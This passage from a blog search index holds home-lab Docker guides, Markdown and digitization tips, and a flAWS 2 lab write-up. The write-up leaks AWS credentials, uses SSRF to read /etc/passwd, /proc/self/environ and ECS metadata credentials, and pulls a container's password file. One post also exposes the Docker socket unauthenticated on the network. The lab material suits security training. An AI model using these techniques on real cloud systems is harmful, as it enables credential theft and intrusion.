order!" }, { "title": "Memos Notes in Home Lab", "url": "/blog/posts/homelab-memos/", "categories": "Home Server", "tags": "memos, home-lab", "date": "2023-05-24 20:00:00 -0400", "snippet": "Memos is a note-taking application aimed at simplified note-taking with nothing but memos! The intent is - we store ideas quickly and forget, relying only on discovery and search based on text and ...", "content": "Memos is a note-taking application aimed at simplified note-taking with nothing but memos! The intent is - we store ideas quickly and forget, relying only on discovery and search based on text and tags to retrieve the information we need.Not only is this application an awesome alternative to generic journaling, it can also work very well with technical people to store information in a concise and quick fashion. It supports markdown syntax, so it’s easy to use, and is also lightweight with all data stored in an SQLite database. It supports pasting images for quick capture, and the notes can be exported as a PNG image too.The app also supports AI operations when you add an OpenAI API token. All of this in a single Docker container!To run this container, start by setting up the directory as follows →mkdir -p $HOME/memosThen, run the container as follows →docker run --rm -d --name=memos \\-v $HOME/memos/:/var/opt/memos \\-p 5003:5230 \\ghcr.io/usememos/memosAn equivalent Docker compose template or a template to deploy using Portainer stacks is as follows →services: memos: image: ghcr.io/usememos/memos container_name: memos networks: - servicesnet ports: - 5003:5230 volumes: - /home/tanq/memos/:/var/opt/memosMemos also has a Telegram bot, Raycast extension, and a Logseq plugin. Both computer and mobile platform app stores have apps to interact with a server. Memos has an authentication mechanism as well, which makes it easy to expose to the public internet as well.And that’s it! Enjoy taking notes (or rather memos)!" }, { "title": "FileBrowser in Home Lab", "url": "/blog/posts/homelab-filebrowser/", "categories": "Home Server", "tags": "filebrowser, home-lab", "date": "2023-05-14 17:41:00 -0400", "snippet": "FileBrowser is a file management service that can run within the local network through a browser. It can be thought of as a “create your own cloud storage” solution, with the cloud being the self-h...", "content": "FileBrowser is a file management service that can run within the local network through a browser. It can be thought of as a “create your own cloud storage” solution, with the cloud being the self-hosted home lab. It has a slick UI for mobile and desktop web browsers and allows all basic functionalities that a service like Google Drive would provide. In addition to that, FileBrowser also has the ability to edit the text in files with syntax highlighting for code files.All of these features are very helpful for local file shares. The entire home directory should be shared with the container to enable editing files relating to other containers. Multiple files can also be zipped, gzipped, or converted into tarballs.To run this container, start by setting up the directory as follows →mkdir -p $HOME/filebrowsertouch $HOME/filebrowser/filebrowser.dbThen, run the container as follows →docker run --rm -d --name=filebrowser \\-v $HOME/filebrowser/:/srv `# can just be $HOME as well` \\-v $HOME/filebrowser/filebrowser.db:/database.db \\-u $(id -u):$(id -g) \\-p 8090:80 \\filebrowser/filebrowserAn equivalent Docker compose template or a template to deploy using Portainer stacks is as follows →services: filebrowser: image: filebrowser/filebrowser container_name: filebrowser # expanding $HOME in volumes so that Portainer can deploy correctly # since $HOME means something else in the Portainer container volumes: - /home/tanq/filebrowser/:/srv - /home/tanq/filebrowser/filebrowser.db:/database.db user: \"1000:1000\" ports: - 8090:80You may also choose not to pass the -u argument; however, passing that ensures that the files created and modified are done so by the user id of the defualt user of the linux system that the container is deployed on. Without the -u argument, the files will be created by the root user instead.One place where not passing specific user ID might be helpful is if the main server home directory needs to be edited by root, specifically container volumes which default to root ownership due to containers using the root user. Editing those files needs root privileges, so you could probably use 2 FileBrowser container - one for all home lab services with root and the volume being /home/&lt;user&gt; for the server, and the other being one with default UID and GID values and a specific directory for storage of files.FileBrowser is an amazing addition to home lab services, and I highly recommend deploying it and using it." }, { "title": "Markdown 101 - Master Your Note-Taking", "url": "/blog/posts/newbified-markdown/", "categories": "Computers Newbified", "tags": "markdown, note-taking, productivity", "date": "2023-05-13 15:21:00 -0400", "snippet": "IntroductionAre you tired of cumbersome note-taking tools that weigh you down with unnecessary features? Look no further than at the power of Markdown — a lightweight and versatile markup language ...", "content": "IntroductionAre you tired of cumbersome note-taking tools that weigh you down with unnecessary features? Look no further than at the power of Markdown — a lightweight and versatile markup language designed for simplicity and efficiency. Whether you’re a student, a professional, or someone looking for a better way to organize and present your thoughts, Markdown is your ultimate solution. Let’s delve into this Markdown world where simplicity meets productivity!Markdown’s Transformative Role in Note-TakingNote-taking is an essential part of our lives, from jotting down ideas during meetings to capturing lecture notes in class. Markdown is uniquely suited for this purpose, thanks to its numerous benefits.First and foremost, Markdown allows you to focus on your content, rather than getting lost in complex formatting options. Unlike rich text editors such as Google Docs or Microsoft Word, which can be overwhelming with their abundant features, Markdown keeps things clean, straightforward, and highly formatable.Note-taking should be lightweight and portable, enabling easy access to your information wherever you go. Markdown’s plain text format ensures that your notes occupy minimal storage space, making them effortlessly transportable across devices, platforms, and software. Additionally, Markdown’s compatibility with various applications and platforms guarantees that you can seamlessly work on your notes from any preferred device or software.Another advantage of Markdown is its transformability and exportability. You can effortlessly convert Markdown files into other formats, such as PDF or HTML, opening up endless possibilities for customization and presentation. By leveraging static site generators like Jekyll, you can transform your Markdown documents into stunning webpages, creating blogs, websites, and reports without the need for complex web development skills. The simplicity and versatility of Markdown empower you to unleash your creativity and produce visually captivating content with ease. In fact, the blog you’re reading this on is also generated by Jekyll based on a purely Markdown content.Embrace Markdown - Best Places to BeginMarkdown is a widely adopted standard, particularly in computer science and programming circles. However, it is accessible to everyone, regardless of technical expertise. Even a basic text editor like Notepad can edit Markdown files. However, there are numerous software options available that provide a more tailored experience → Obsidian → A powerful note-taking app with robust organizational features and cross-linking capabilities. Simplenote → A lightweight note-taking app that syncs seamlessly across devices. iA Writer → A minimalist writing app that provides a distraction-free environment. Joplin → An open-source note-taking app with end-to-end encryption for enhanced security. Notable → A versatile note-taking app that supports Markdown and code snippets. Standard Notes → A secure and privacy-focused note-taking app with Markdown support. Bear (for Apple only) → A beautiful and intuitive writing app exclusively available for Apple devices. Logseq → A note-taking app focused on the concept of interconnected “blocks” for enhanced organization. Drafts (for Apple only) → A powerful app that allows you to capture ideas quickly and efficiently. Taio (for Apple only) → An all-in-one workspace app with Markdown support for seamless note-taking and task management.It’s worth noting that Markdown is also the default writing mode on GitHub, making it an ideal choice for developers and those who collaborate on code-based projects. In fact, the very blog post you are reading is written in Markdown and hosted on GitHub, highlighting its versatility and widespread usage.Additionally, a class of note-taking applications operate based on the concept of blocks, such as the immensely popular Notion. These apps combine the visual appeal of block-based editing with the simplicity and flexibility of Markdown syntax. Notion, Craft (for Apple only), and Appflowy are excellent examples of these block-based note-taking ecosystems. They offer advanced features, customizable layouts, and seamless integration with Markdown syntax, allowing you to create stunning and highly organized notes.Personal or company wikis also support Markdown. Some of the most popular ones are Wiki.JS, TiddlyWiki, and Confluence. Organizations can use these wikis to organize their internal documentation and processes.Syntax and Formatting“Markdown has a learning curve” is a phrase you WILL encounter online. But I disagree! Word processing tools like Microsoft Word and Google Docs have a much steeper learning curve. You need to worry about formatting, indentation, font sizes! It’s hard to emphasize words or phrases easily. How many times have you tried to make your heading bold and find your text formatted bold too? And then, when you disable bold again and clear the line, you’re back to bold! That’s a whole lot of frustration! How many steps to add a simple horizontal line as a separator? All that makes note-taking hard. These word processors do have a place when footers, headers, colored documents, formal documents, and forms are concerned. But that’s less than 10% of the time. Why write in frustration the remaining 90% of the time?So, first and foremost, try out Markdown in your browser here → MDLivePreview or StackEdit or Dillinger.You could read through those default documents and understand the basic syntax of Markdown, but I want to provide a cheatsheet here. This is some markdown text that I’ve written using most of the basic syntactical concepts. Next, find the rendered PDF version of how that documents looks.You can also refer to this article to learn Markdown syntax.FinSo, Markdown is a powerful tool that unlocks a world of possibilities in note-taking and document creation. Its lightweight nature, ease of use, and broad support across platforms and applications make it the perfect choice for anyone looking to enhance their productivity and simplify their workflow. So why wait? Discover Markdown at your earliest convenience, and I guarantee your future self will thank you for it!" }, { "title": "Document Digitization - The Paperless Revolution", "url": "/blog/posts/newbified-digitization/", "categories": "Computers Newbified", "tags": "data-digitization, productivity", "date": "2023-05-13 02:08:00 -0400", "snippet": "IntroductionIn today’s world, physical documents have become very common, accumulating for various purposes. However, it is essential to recognize the advantages of digitizing these documents. From...", "content": "IntroductionIn today’s world, physical documents have become very common, accumulating for various purposes. However, it is essential to recognize the advantages of digitizing these documents. From improved reference and preservation to easy access and searchability, the benefits to digitized documents are undeniable. Let’s explore a process of digitizing physical documents and how it can revolutionize the way we manage information.Where to BeginThe first step in the digitization process is to gather all your physical documents into a centralized location, such as a cupboard or room. If you already maintain a filing system for organizing important documents in a specific box or shelf, that’s a great starting point. However, if you haven’t established such a system, don’t worry - it’s not too late to begin!To ensure seamless access to your digitized files, I recommend saving them in the cloud. Cloud storage providers, such as iCloud, Google Drive, Box, OneDrive, and IceDrive, are secure and reliable services. Choose a provider that suits your needs and preferences. For most individuals, Google Drive is a popular and functional choice, providing 15 GB of free storage per account.Next, equip yourself with a reliable scanner app. Adobe Scan and Microsoft Lens are two reputable third-party options, while Apple and Android devices both offer built-in scanning capabilities. In iOS, the Files app allows scanning with a limit of 25 pages per scan, while Android users can utilize the pre-installed Google Drive app for direct scanning to the cloud. iOS can also use the Google Drive app’s scanning functionality.The ProcessWith all your documents gathered in one place, set aside a few hours to sort through them. Begin by identifying the most important documents, such as health records, leases, and tax information. Separate these vital files from the rest, following the guidelines in one of my previous blog posts Overhaul Personal Cloud Storage. Once you have established this initial selection, plan to digitize 10-20 files per day.To effectively organize your important files, consider using the divisions outlined in Overhaul Personal Cloud Storage. Take a couple of days to scan all your significant files and upload them to your cloud storage provider of choice. Keep their physical counterparts in a designated location and store them in a labeled box.As you go through the remaining general-purpose files, assess their importance. Determine if they are documents you may need/want to refer to in the future. If they are indeed significant, scan and name them appropriately. A good naming scheme could include relevant details, such as the document’s subject, location, and year. For instance, the following provides valuable information about the document’s contents.socico_apartments-insuro-house_insurance-2021.pdfFor all the general-purpose files deemed important, create a couple of folders (on the cloud) to store them, perhaps categorized by years. I recommend discarding any physical files that hold no significance. If you have sufficient physical storage space, consider keeping the physical copies of these useless documents in a separate box to avoid confusion. Receipts, in general, are not of utmost importance. In today’s digital era, most services provide online platforms and apps (such as Amazon) that generate PDF receipts on demand. Evaluate your receipt-type files based on their accessibility through online services. If they are easily accessible, there’s no need to digitize them.ConclusionDigitizing physical documents offers tremendous advantages and simplifies our daily lives. Need to email a document to someone? It’s just a quick search away in your digital archive. Moreover, searching for specific information becomes effortless through keywords instead of sifting through physical files for hours. Advanced features offered by certain services, like Apple’s Files app, even allow indexing text within the documents, making searching and retrieving information a breeze. The convenience of digitization extends beyond typed documents - handwritten notes can also be parsed and included in your digital library. Additionally, digitization ensures the preservation of important information and reduces clutter to free up physical space.So, go forth and embrace the power of digitalization and unlock a world of convenience, efficiency, and peace of mind." }, { "title": "flAWS 2 - Attacker", "url": "/blog/posts/flaws-2-attacker/", "categories": "Lab Practice Notes, AWS Labs", "tags": "aws, lab, flaws2, security", "date": "2023-05-13 01:42:00 -0400", "snippet": "Level 1 The problem statement is to enter a correct pin code on a website that is 100 digits long.The first thing to do is to look at the HTML source, where the form that takes the input submits t...", "content": "Level 1 The problem statement is to enter a correct pin code on a website that is 100 digits long.The first thing to do is to look at the HTML source, where the form that takes the input submits to the following API Gateway URL →https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1The source also has a JS construct with the following →&lt;script type=\"text/javascript\"&gt; function validateForm() { var code = document.forms[\"myForm\"][\"code\"].value; if (!(!isNaN(parseFloat(code)) &amp;&amp; isFinite(code))) { alert(\"Code must be a number\"); return false; } }&lt;/script&gt;Since the client-side validation code expects it to be a finite number, we can try bypassing that control and sending a string instead. We can do this using cURL. Doing so results in a malformed input error and spits out environment variables, likely due to developer errors, for the Lambda function handling the request. The returned environment JSON object can be pretty printed as follows →curl \"https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=qwer\" | grep -v \"Error, malformed input\" | jqWe can explore the AWS environment using these session credentials. We can verify credentials as follows →AWS_ACCESS_KEY_ID=\"ASIAZ....\" AWS_SECRET_ACCESS_KEY=\"DEZBc....\" AWS_SESSION_TOKEN=\"IQoJb3JpZ2luX2V....\" aws sts get-caller-identitywhich returns →{ \"UserId\": \"AROAIBATWWYQXZTTALNCE:level1\", \"Account\": \"653711331788\", \"Arn\": \"arn:aws:sts::653711331788:assumed-role/level1/level1\"}We can export the variables to the shell to make it easier.Like flAWS-1, likely, the website is statically hosted via S3, so that should be the first exploration point. We can perform the following sequence of commands to explore S3 and find the next level →aws s3 ls # deniedaws s3 ls s3://level1.flaws2.cloud # allowed and shows a secret file# download the secret fileaws s3 cp s3://level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html ./The secret file contains the URL for the next level →http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloudLevel 2 Problem statement says that the level challenge is running as a container at URL http://container.target.flaws2.cloud/, and the associated ECR registry/repository name is “level2”.The website in the container requests a login before returning any markup source. So, the only other available information is the ECR registry/repository name. With some thought, it has to be the repository name. It is also likely that the registry is publicly accessible, in which case we should be able to look at the image to figure out what web service is running and possibly look at credentials. We can also assume that the account is the same as what we discovered in level 1. So, we can also use the same CLI credentials.First, check the access to the repository by listing all images as follows →aws ecr list-images --repository-name level2 --registry-id 653711331788which returns →{ \"imageIds\": [ { \"imageDigest\": \"sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e\", \"imageTag\": \"latest\" } ]}There’s only one image, likely the one that’s running the website, so we can list all layers of the image and pull them one by one to construct the container file system locally as follows →aws ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids \"imageDigest=sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e\"This gives a list of digests referring and relating to gzipped tarballs of image layers for the above image. We can retrieve each layer by using the get-download-url-for-layer sub-command. For multiple layers, let’s automate that with a quick for-loop →mkdir image; cd imagefor i in $(awsn ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids \"imageDigest=sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e\" | jq -r '.images[0].imageManifest | fromjson | .layers[].digest')do echo $i wget $(awsn ecr get-download-url-for-layer --registry-id 653711331788 --repository-name level2 --layer-digest \"$i\" | jq -r '.downloadUrl') -O test tar -xzf testdonecd ..This creates the complete filesystem for the image. Since it’s a website, we can search for common web server applications like Apache or Nginx and password or credential files. I used fdfind for that, and a hit and try on the following led me to the .htpasswd file for Nginx →fdfind apache . -Hfdfind nginx . -Hla ./etc/nginxbat ./etc/nginx/.htpasswdThe last command gave the following →flaws2:$apr1$jJh7fsij$wJV.a0WR6hAZ51/r11myl/This is likely crackable but maybe not too. It’s better to turn to another method to obtain instructions per layer for the image. One way to do that is to use Docker to log in with the AWS credentials and use docker inspect on the pulled image. To log in to Docker with the AWS credentials, do the following →aws ecr get-login-password # spits off a token; export it as TOKENdocker login -u AWS -p $TOKEN 653711331788.dkr.ecr.us-east-1.amazonaws.comThen, pull the image and look at its interpreted command history as follows →docker pull 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latestdocker history 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2 --no-trunc | grep htpasswdOne of the commands there sets the .htpasswd as follows (which also gives us the password) →htpasswd -b -c /etc/nginx/.htpasswd flaws2 secret_passwordUsing these credentials in the containerized website gives the next level’s URL as →http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud/Level 3 The problem statement tells us that the container also has a simple proxy service running within and gives two examples to visit the fLAWS-1 URL and neverssl.com.The first impulse is to try the IMDSv1 endpoint in case the container was running within an EC2 instance. However, that didn’t produce any results. Looking at the image filesystem from the previous level, we can try to find the proxy code using fdfind proxy . -H, which shows a file available at ./var/www/html/proxy.py. The proxy script takes the path and removes the leading /, and queries everything else as a URL.Next, it’s likely the container is running as an ECS task. AWS states that ECS tasks can have credentials that are retrievable from inside the container with →curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URIOf course, this won’t directly work since the environment variable isn’t retrievable inside the Python code using the $ denotation. So, we can try to retrieve that variable by other means. Trying another scheme like file:// seems to work for the following payload →curl http://container.target.flaws2.cloud/proxy/file:///etc/passwdProcess environment variables can be listed via /proc/&lt;PID&gt;/environ, and we can try passing in self for the PID. The command would then look like →curl http://container.target.flaws2.cloud/proxy/file:///proc/self/environ --output -This gives the result as →HOSTNAME=ip-172-31-75-168.ec2.internalHOME=/rootAWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/92a61680-599c-4b2d-ab9c-e8aa8cbe207fAWS_EXECUTION_ENV=AWS_ECS_FARGATEECS_AGENT_URI=http://169.254.170.2/api/9d3f98af337e441985892fa63d737081-3779599274AWS_DEFAULT_REGION=us-east-1ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/9d3f98af337e441985892fa63d737081-3779599274ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/9d3f98af337e441985892fa63d737081-3779599274PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binAWS_REGION=us-east-1PWD=/With that information in hand, we can retrieve the credentials as follows →curl http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/92a61680-599c-4b2d-ab9c-e8aa8cbe207f | jqWith those credentials, we get access to the following role →{ \"UserId\": \"AROAJQMBDNUMIKLZKMF64:9d3f98af337e441985892fa63d737081\", \"Account\": \"653711331788\", \"Arn\": \"arn:aws:sts::653711331788:assumed-role/level3/9d3f98af337e441985892fa63d737081\"}From here, enumeration seems like a shot in the dark 🤔. Knowing the track record of past solutions, S3 should be the first stop due to static hosting. We can now list all buckets, and there is a “The End” bucket, i.e., the lab is complete.Final page →the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud" }, { "title": "Homepage Dashboard in Home Lab", "url": "/blog/posts/homelab-homepage/", "categories": "Home Server", "tags": "homepage, home-lab", "date": "2023-05-07 20:53:00 -0400", "snippet": "Homepage is a slick-looking dashboard that I use in my home lab. Out of at least 10 other dashboard applications I tried, Homepage is the only one that struck the right balance of elegance, simplic...", "content": "Homepage is a slick-looking dashboard that I use in my home lab. Out of at least 10 other dashboard applications I tried, Homepage is the only one that struck the right balance of elegance, simplicity, and functionality.DeploymentAs usual, Docker is the best way to deploy the dashboard application. Make a local directory for it as follows →mkdir -p $HOME/homepageThen, deploy the container as follows →docker run --rm -d \\--name homepage \\-p 3000:3000 \\-v $HOME/homepage:/app/config \\-v /var/run/docker.sock:/var/run/docker.sock \\ghcr.io/benphelps/homepageFor Docker compose or via Portainer stacks, the following template can be used →services: homepage: image: ghcr.io/benphelps/homepage container_name: homepage # expanding $HOME in volumes so that Portainer can deploy correctly # since $HOME means something else in the Portainer container volumes: - /var/run/docker.sock:/var/run/docker.sock - /home/tanq/homepage:/app/config ports: - 3000:3000And that’s it! All that’s left is to configure it!Usage &amp; SetupHomepage is a static-style dashboard, i.e., we need to edit the configuration files to make changes. That’s not the optimal way to do things, but some multi-cursor magic in VS-Code or Sublime-Text can help. It’s highly configurable and has a ton of functionality involving widgets, service integrations, etc.For me, the main sections of interest are as follows → Services → These are the big boxes that we can configure to provide basic information about the resource usage of our containers. Bookmarks → As the name suggests, it’s a list of websites. The good part is there’s a huge library of icons available at Dashboard Icons that are supported, and a couple of other sources mentioned in the documentation.Adding services from a different server than where the dashboard is loaded needs the application to communicate with the Docker socket of that server. There are multiple options for doing that, but the two best options are - to expose the port in the local network or use docker-socket-proxy. I went with the first option, but I want to caution you: exposing the socket is not safe, but it isn’t an issue if it’s in the home network only. To do that, I used the following steps as root on the server →cat &lt;&lt; EOF &gt; /etc/docker/daemon.json{\"hosts\": [\"tcp://0.0.0.0:2375\", \"unix:///var/run/docker.sock\"]}EOFmkdir -p /etc/systemd/system/docker.service.d/cat &lt;&lt; EOF &gt; /etc/systemd/system/docker.service.d/override.conf[Service]ExecStart=ExecStart=/usr/bin/dockerdEOFsystemctl daemon-reload &amp;&amp; systemctl restart docker.serviceThe steps and discussions on the topic are present in this gist. After these instructions, the server’s Docker socket will be available in the local network.FinAn example setup of my Homepage dashboard is as follows →Maybe that provides some inspiration. I also want to mention a couple of other dashboards that are famous and might be worth looking into → Dashy Heimdall Dashboard FlameGood luck with your dashboard setup!If most of these services are accessed via mobile devices and browsers, it may also be easy to integrate the IP:port combinations or internal domain names with the browser bookmarks or home screen app icons for mobile." }, { "title": "AdGuard in Home Lab", "url": "/blog/posts/homelab-adguard/", "categories": "Home Server", "tags": "adguard, home-lab", "date": "2023-05-07 12:22:00 -0400", "snippet": "AdGuard Home is a network-wide DNS sink hole, like PiHole. Like most services, this can be deployed as a container, which is the easiest way to set it up.DeploymentAdGuard provides a wiki to help w...", "content": "AdGuard Home is a network-wide DNS sink hole, like PiHole. Like most services, this can be deployed as a container, which is the easiest way to set it up.DeploymentAdGuard provides a wiki to help with the installation through docker. It’s best to install AdGuard Home in a home lab on Linux, which usually has systemd-resolved running. resolved will prevent deploying the container with port 53 bound, so the local stub resolver would need to be disabled.Begin by deploying the home directory structure →mkdir -p $HOME/adguard/{work,conf}Next, run the following to figure out if resolved is active →service systemd-resolved statusIf resolved is inactive, you should skip to the docker run step. Otherwise, perform the following commands serially →sudo mkdir -p /etc/systemd/resolved.conf.d/sudo mv /etc/resolv.conf /etc/resolv.conf.backupsudo ln -s /run/systemd/resolve/resolv.conf /etc/resolv.conf# get a root shellsudo sucat &lt;&lt; EOF &gt; /etc/systemd/resolved.conf.d/adguardhome.conf[Resolve]DNS=127.0.0.1DNSStubListener=noEOFThen, exit out of the root shell and restart systemd-resolved as follows →sudo systemctl reload-or-restart systemd-resolvedFinally, run the docker container as follows →docker run --name adguardhome \\ --restart unless-stopped \\ -v $HOME/adguard/work:/opt/adguardhome/work \\ -v $HOME/adguard/conf:/opt/adguardhome/conf \\ -p 53:53/tcp -p 53:53/udp \\ -p 80:80/tcp -p 443:443/tcp -p 443:443/udp -p 3001:3000/tcp \\ -p 853:853/tcp \\ -d adguard/adguardhomeAn equivalent Docker compose template or a template to deploy using Portainer stacks is as follows →services: adguardhome: image: adguard/adguardhome container_name: adguardhome restart: unless-stopped # expanding $HOME in volumes so that Portainer can deploy correctly # since $HOME means something else in the Portainer container volumes: - /home/tanq/adguard/work:/opt/adguardhome/work - /home/tanq/adguard/conf:/opt/adguardhome/conf ports: - \"53:53/tcp\" - \"53:53/udp\" - \"80:80/tcp\" - \"443:443/tcp\" - \"443:443/udp\" - \"3001:3000/tcp\" - \"853:853/tcp\"I’ve omitted some ports used for DNS-over-QUIC and DHCP, but those can be included as necessary following the documentation.Now, visit http://&lt;server&gt;:3001 to begin configuring an account for AdGuard. Follow the instructions and log in to the web interface as port 80/443.Usage &amp; SetupAdGuard works as a sink-hole, such that DNS requests to domains present in denylists are answered with a bogus value or 0.0.0.0 such that the devices making DNS requests cannot load appropriate assets from the translated IP addresses. To do that, AdGuard (and many other ad blockers) use filter lists, which are text files that contain a list of domains.Go to Filters &gt; DNS blocklists on the AdGuard interface. Select “Add blocklist” and check all the sources curated by AdGuard and disable each one from the imported collection. Then, enable the following → AdGuard DNS filter AdAway Default Blocklist Phishing URL Blocklist NoCoin Filter List OISD Blocklist SmallLastly, add two more custom lists from public sources as follows → EasyList → https://easylist.to/easylist/easylist.txt FanBoy’s Annoyances → https://secure.fanboy.co.nz/fanboy-annoyance.txtOf course, the DNS sinkhole also supports a log of all queries that have been answered or denied. DNS Rewrite is a feature that allows setting custom IP addresses as resolutions for specific domain names, so things like personal cloud servers or local servers can be granted a domain name for easy connections.One of the most useful features in AdGuard is the option to disable the filtering for a short period of time. On the home page of the webapp, filtering can be disabled for a time period determined by a dropdown of time period (30 seconds to 10 minutes). This is extremely useful when certain sites need to be loaded without worrying about ads or trackers because the protection is automatically enabled after the time period of selection.AdGuard Home can also function as a DHCP server, though I prefer using the home router as the DHCP server and restrict AdGuard for just DNS filtering. AdGuard can be provided custom upstream DNS providers like Cloudflare and Quad9, and also supports advanced configurations such as load balancing among multiple upstream providers.OutroYou can verify the blocking status as AdBlock Test. This test is rigorous, so don’t expect a 100 result. A perfect score isn’t necessary, but if you really want to, add additional lists like “OSID Blocklist Big”. Keep in mind that an excessive number of filters can cause performance overload on the container (and the host).AdGuard helps blocks ads for all devices in a local network while protecting the processing power of the devices themselves to block the ads. Enjoy an adless experience with AdGuard today!" }, { "title": "Container Management in Home Lab - Portainer, Dockge & Yacht", "url": "/blog/posts/homelab-container-mgmt/", "categories": "Home Server", "tags": "portainer, yacht, home-lab", "date": "2023-05-07 00:46:00 -0400", "snippet": "Reasoning &amp; CandidatesHome Labs come in different shapes and sizes. We could have a multi-node setup running Kubernetes and a couple of other servers running Proxmox with specialized virtual ma...", "content": "Reasoning &amp; CandidatesHome Labs come in different shapes and sizes. We could have a multi-node setup running Kubernetes and a couple of other servers running Proxmox with specialized virtual machines and containers, all interacting with each other over TLS; or it can be a simple raspberry pi running a single docker container like Plex or PiHole. But irrespective of the size of a home lab, the intention is - to make your home network cool and automate some parts of your life or improve experiences related to your everyday activities. With this intent in mind, a container management service can help debug issues and observe logs, manage running services by spinning them up or down, obtain command line access to running containers, and organize and monitor all the images/volumes/containers from an eagle-eyed view.All of this can make our home lab life easy. So, it’s another quality of life improvement. IMO, the two best container management services that have the most engaging communities are Portainer and Yacht. Another one that popped up in the end of 2023 is Dockge.All these services offer installation via Docker and provide helpful information sets and container management toolsets. One can even end up running all of them together! The main differences are as follows → Portainer initially started as built-for-containers but slowly expanded its horizons to other technologies like remote host Docker container management, Docker Swarm management, and Kubernetes cluster management; whereas Yacht and Dockge are purpose-built for containers. Portainer is well established and has a business offering with advanced features while Yacht and Dockge are relatively new and have a limited but refined feature set. Portainer also provides the ability to exec into customers directly from the web UI, even in the community version. Dockge supports the same functionality.My choice here is Portainer for three reasons - to deploy using the latest Docker compose plugin, the ability to exec into containers directly from within the browser, and expand control to a Kubernetes cluster or Docker Swarm. However, after learning about Dockge, I also shifted to that instead of Portainer because it just turned out to be very straightforward and provided me exactly the feature set I wanted.DeploymentPortainerFirst, setup a local config directory as follows →mkdir -p $HOME/portainerThen launch the container as follows →docker run -d \\-p 8000:8000 -p 9443:9443 \\--name portainer \\-v /var/run/docker.sock:/var/run/docker.sock \\-v $HOME/portainer:/data \\portainer/portainer-ce:latestThen access the service on port 9443 and set up a strong password. Portainer has the concept of environments. The machine that the Portainer container is deployed on becomes the local environment. The most common way of adding new environments is to deploy a Portainer image in the other machines, which will sync to the main server in the local environment. The Portainer Agent can be deployed as follows on the other machines →docker run -d \\-p 9001:9001 \\--name portainer_agent \\-v /var/run/docker.sock:/var/run/docker.sock \\-v /var/lib/docker/volumes:/var/lib/docker/volumes \\portainer/agentAfter that, add the agent to the container UI deployed via the local environment.DockgeFirst, setup a local config directory. Unlike the rest, for this one, certain reasons demand creation of a directory in /opt. There could be ways to get around that but it’s fruitless effort. So I do the following →sudo mkdir -p /opt/dockge/{data,stacks}Then setup the container with a docker run command as follows →docker run --name dockge --rm -d \\-v /var/run/docker.sock:/var/run/docker.sock \\-v /opt/dockge/data:/app/data \\-v /opt/dockge/stacks/:/opt/dockge/stacks/ \\-e DOCKGE_STACKS_DIR=/opt/dockge/stacks \\-p 9441:5001 \\louislam/dockge:1I went with port 9441 but of course that can be changed. The default 5001 is generally used for other services in my network.YachtYacht is competitive with Portainer but has limited functionalities. To run the container, first, create a directory for config as follows →mkdir -p $HOME/yachtThen deploy the container as follows →docker run --name yacht \\-d -p 8000:8000 \\-v /var/run/docker.sock:/var/run/docker.sock \\-v $HOME/yacht:/configselfhostedpro/yachtThe port can be changed to 8001 on the host side if Portainer is needed to run simultaneously.I recommend checking out the other two projects as well and ensuring they work for your use case. Then, have fun!Portainer/Dockge StacksSince I primarily use Portainer/Dockge, I also want to highlight this - they can be used to deploy containers using Docker’s compose plugin through the use of Docker compose YAML template files. This feature is called Stacks. This makes it very easy to maintain and port a home lab. This is because starting Portainer on a server is a single command like mentioned above under “Deployment”, and all other containers can simply be maintained as compose (or stack) definitions.While each service can be deployed as a separate stack, it’s also easy to deploy everything as a single stack if it’s small enough. Maintaining a single compose YAML template helps to start all of the services in a single-click fashion. Alternatively, separate stacks allow easy debugging on the home server. Additionally, you can deploy containers in specific networks easily (though it’s generally best to isolate them). Stack are defined via YAML syntax and this is very useful for deploying services together. However, keep in mind that if Portainer is started as the root user, then the volume binds will also be maintained and inherited by root, which might be an issue if other services/containers need to access the same volume mounts.The stacks also allow editing the definitions on the browser UI. One of the features I use very often is the checkbox of “Re-pull and deploy” on Portainer and a similar option in Dockge when updating a stack. This can be done without actually making a modification to the definition, allowing a simple update of the containers in a given stack. Again, there are other services like Watchtower that are great at updating containers, but I just like to do that manually for specific stacks.An example compose YAML template for some of the services mentioned in my blog is as follows →services: adguardhome: image: adguard/adguardhome container_name: adguardhome networks: - adguardnet restart: unless-stopped volumes: - /home/tanq/adguard/work:/opt/adguardhome/work - /home/tanq/adguard/conf:/opt/adguardhome/conf ports: - \"53:53/tcp\" - \"53:53/udp\" - \"80:80/tcp\" - \"443:443/tcp\" - \"443:443/udp\" - \"3001:3000/tcp\" - \"853:853/tcp\" filebrowser: image: filebrowser/filebrowser container_name: filebrowser networks: - servicesnet volumes: - /home/tanq/:/srv - /home/tanq/filebrowser/filebrowser.db:/database.db ports: - 5002:80 homepage: image: ghcr.io/benphelps/homepage container_name: homepage networks: - servicesnet volumes: - /var/run/docker.sock:/var/run/docker.sock - /home/tanq/homepage:/app/config ports: - 5001:3000 local_dumpster: image: tanq16/local_dumpster:main container_name: local_dumpster networks: - servicesnet ports: - 5000:5000 jellyfin: image: jellyfin/jellyfin container_name: jellyfin networks: - jellynet restart: unless-stopped volumes: - /home/tanq/jellyfin/config:/config - /home/tanq/jellyfin/cache:/cache - /media/tanq/Tanishq/Media/:/data/media ports: - 8096:8096networks: adguardnet: servicesnet: jellynet:Now that is useful, if nothing else! Of course, specific situations may require that containers be deployed via individual stacks, so it’s easy to 